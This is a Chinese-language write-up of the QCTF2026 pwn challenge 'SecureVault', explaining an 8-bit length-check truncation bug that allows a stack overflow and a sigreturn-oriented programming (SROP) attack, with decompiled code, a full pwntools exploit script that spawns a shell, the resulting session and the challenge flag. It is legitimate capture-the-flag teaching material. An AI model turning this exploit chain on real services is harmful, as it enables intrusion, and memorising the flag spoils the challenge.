---
title: SecureVault（QCTF2026 pwn）
date: 2026-10-21
category: Pwn
tags:
  - CTF
  - Writeup
  - pwn
draft: false
summary: "SROP题，让我了解一下怎么做的"
collection: QCTF2026
---
# SecureVault

## 第一节：题目

SROP题，让我了解一下怎么做的
## 第二节：过程
依旧开局先玩一下这个
```bash
================ SecureVault 使用说明 ================
1. store   : 把一段数据存入保险箱（最多 4096 字节）
2. encrypt : 输入消息长度并加密消息（最多 64 字节）
3. exit    : 离开
------------------------------------------------------
```
我们先检查一下给的附件 chall 开了什么保护
```python
from pwn import *
elf = ELF("chall")
elf.checksec()
```
返回了
```python
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
无PIE说明地址写死，Canary没有说明从缓冲器到返回地址中间没有检查，我们可以盖到ret来栈溢出，而我们用ROPgadget发现
![](/assets/posts/qctf2026/qctf2026-pwn-securevault-1.png)
没有pop rdi / rsi / rdx / rax 这说明我无法直接调用system("/bin/sh")（因为想要ROP调用execve要前面的这些gadget，就算是ret2libc调用system也要有libc地址，但是程序没有地址泄露，所以不行），说明传统逐个设参的ROP走不通
而这正是SROP的的用武之地
这个时候也是时候打开IDA来看看结构了
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rsi
  __int64 v5; // rdx
  __int64 v6; // rsi
  char choice; // [rsp+Fh] [rbp-1h]

  xwrite(
    a1: "==================================================\n"
    "       SecureVault v1.0 \n"
    "==================================================\n",
    a2: argv,
    a3: envp);
  while ( 1 )
  {
    xwrite(a1: "[menu] 1.store  2.encrypt  3.help  4.exit\n> ", a2: v4, a3: v3);
    choice = read_choice();
    if ( choice == 0 )
      return 0;
    if ( choice == 52 )
    {
      xwrite(a1: "bye~\n", a2: v6, a3: v5);
      return 0;
    }
    if ( choice > 52 )
    {
LABEL_13:
      xwrite(a1: &unk_4022A3, a2: v6, a3: v5);
    }
    else
    {
      switch ( choice )
      {
        case '3':
          help();
          break;
        case '1':
          store();
          break;
        case '2':
          encrypt();
          break;
        default:
          goto LABEL_13;
      }
    }
  }
}
```
不过main函数并没有什么需要关注的地方，它只是一个菜单分发器
我们来看看store和encrypt
```c
__int64 __fastcall store(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdx
  __int64 v4; // rsi
  __int64 v6; // rdx
  __int64 v7; // rsi
  unsigned __int16 uint16; // [rsp+Eh] [rbp-2h]

  xwrite(a1: &unk_402008, a2, a3);
  uint16 = read_uint16();
  if ( uint16 > 0x1000u )
    return xwrite(a1: &unk_402025, a2: v4, a3: v3);
  xwrite(a1: &unk_402040, a2: v4, a3: v3);
  fast_read(a1: 0, a2: &vault, a3: uint16);
  return xwrite(a1: &unk_402057, a2: v7, a3: v6);
}
```
```c
__int64 __fastcall encrypt(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdx
  __int64 v4; // rsi
  __int64 v6; // rdx
  __int64 v7; // rsi
  _BYTE v8[78]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int16 uint16; // [rsp+4Eh] [rbp-2h]

  xwrite(a1: &unk_402072, a2, a3);
  uint16 = read_uint16();
  if ( (unsigned __int8)uint16 > 0x40u )
    return xwrite(a1: &unk_402090, a2: v4, a3: v3);
  xwrite(a1: &unk_4020B5, a2: v4, a3: v3);
  fast_read(a1: 0, a2: v8, a3: uint16);
  return xwrite(a1: "[+] encrypted!!", a2: v7, a3: v6);
}
```
我们惊讶地注意到了store 和encrypt有一个对于unit16处理的区别
```c
if ( uint16 > 0x1000u )    //store
if ( (unsigned __int8)uint16 > 0x40u )  //encrypt 先截成8位再比
```
而问题就在(unsigned int8) 强制转换上，store检查和实际读取都是16位没错，但是encrypt检查8位实际上16位！ 检查只放行了低字节，读的时候却按完整长度读。从数字超过了64不行变成了低八位数字超过了64不行——也就是说我们可以更改高8位的数字，因此64 可以 320 也可以 4160（store的上限0x1000+encrypt的上限0x40）也可以
我们先来看整个内核的流程：
当出现信号了之后，内核把所有寄存器压栈（压栈之后的状态是sigframe），然后跳到信号处理函数去执行，结束返回时调用rt_sigreturn（系统调用号固定是15），之后再把栈上的sigframe快照读回来，复原寄存器。
关键就在于内核不会验证这份快照前后是不是一样的，也就是说rsp在哪，内核就从哪读，那我们只要把rsp指到我们特意写好的假快照上，就可以手动操控读取值了
相较于普通的ROP，每个寄存器都需要对应的gadget，SROP的最大优势在于我们只需要一个syscall就可以了，那在这里我们拿原本属于信号机制的rt_sigreturn当批量设置寄存器的gadget，也就是说，接下来我们还要做的就是自己手动构建一个假的frame，然后在读快照之前通过栈的跳跃将rsp落到假frame即可，而这个frame当然是帮助我们拿shell的啦
接下来我们来看看栈布局
看看encrypt的其中两行
```c
  _BYTE v8[78]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int16 uint16; // [rsp+4Eh] [rbp-2h]
```

v8位于rbp-0x50，而返回地址在rbp+0x08是固定的，因为函数结尾是leave，而leave先吃保存的rbp，retn再吃rbp+0x08所以地址固定在rbp+0x08

![](/assets/posts/qctf2026/qctf2026-pwn-securevault-2.png)
因此距离就是0x50+0x08 = 88
接下来我们要做的是怎么让rax = 15
看read_uint16():
```c
__int64 read_uint16()
{
  char v1; // [rsp+7h] [rbp-9h] BYREF
  int i; // [rsp+8h] [rbp-8h]
  unsigned int v3; // [rsp+Ch] [rbp-4h]

  v3 = 0;
  for ( i = 0; i <= 7 && fast_read(a1: 0, a2: &v1, a3: 1) == 1 && v1 != 10 && v1 != 13; ++i )
  {
    if ( v1 > 47 && v1 <= 57 )
      v3 = 10 * v3 + v1 - 48;
  }
  return v3;
}
```
read_uint16是被ret强制送进去的，正常它是被call的，但是我们修改返回地址让它再跳过去，就可以无缝衔接
而v3是我们输入的数字，我们之前说了rt_sigreturn的调用号是15，那我们输入了15之后，return 15在汇编里面就是
![](/assets/posts/qctf2026/qctf2026-pwn-securevault-3.png)
而自己的ret弹出的是我们的syscall地址，最后内核判定rt_sigreturn
本意是输入长度，没想到还有pop rax的功能
最后我们写frame字段

| rax | 59       | execve调用号 |
| --- | -------- | --------- |
| rdi | 0x404040 | 指向/bin/sh |
| rsi | 0        | NULL      |
| rdx | 0        | NULL      |
| rip | 0x40112d | syscall指令 |
| rsp | 0x404840 | 随意的可写地址   |

接下来的流程就算，syscall第一次，rax = 15，在内核里做rt_sigreturn然后rsp从frame开始读，把frame里的东西都装在寄存器，之后再syscall第二次，rax = 59 ，让内核做execve("/bin/sh",NULL,NULL)，就可以拿shell了

```python
from pwn import *
import sys

context.arch = "amd64"          
io = remote(sys.argv[1], int(sys.argv[2]))

VAULT = 0x404040
READ16 = 0x40116f
SYSCALL = 0x40112d

#把 /bin/sh 存进 vault
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b": ")
io.sendline(b"8")
io.recvuntil(b": ")
io.send(b"/bin/sh\x00")

#打溢出，铺 SROP 链
io.recvuntil(b"> ")
io.sendline(b"2")
io.recvuntil(b": ")
io.sendline(b"4160")            # 0x1040，低字节 0x40 过检
io.recvuntil(b": ")

frame = SigreturnFrame()
frame.rax = 59                  # execve
frame.rdi = VAULT               # "/bin/sh"
frame.rsi = 0                   # argv = NULL
frame.rdx = 0                   # envp = NULL
frame.rip = SYSCALL             # 装完寄存器后跳回 syscall
frame.rsp = VAULT + 0x800       # 可写落脚点

io.send(b"A" * 88 + p64(READ16) + p64(SYSCALL) + bytes(frame))
io.recvuntil(b"encrypted!!")    # 352 字节已经读完

#敲 15，把 rax 变成 15
io.send(b"15\n")
sleep(0.3)

io.interactive()
```

```bash
[*] Switching to interactive mode
ls -la
total 24
drwxr-xr-x 1 root root  4096 Sep 20 16:59 .
drwxr-xr-x 1 root root  4096 Oct 26 08:19 ..
-rwxr-xr-x 1 root root 16080 Sep 20 16:58 chall
cat flag
cat: flag: No such file or directory
cat /flag
QCTF{de123e4c-6868-4316-916e-cb43c4df836b}
```
最终复现flag
`QCTF{de123e4c-6868-4316-916e-cb43c4df836b}`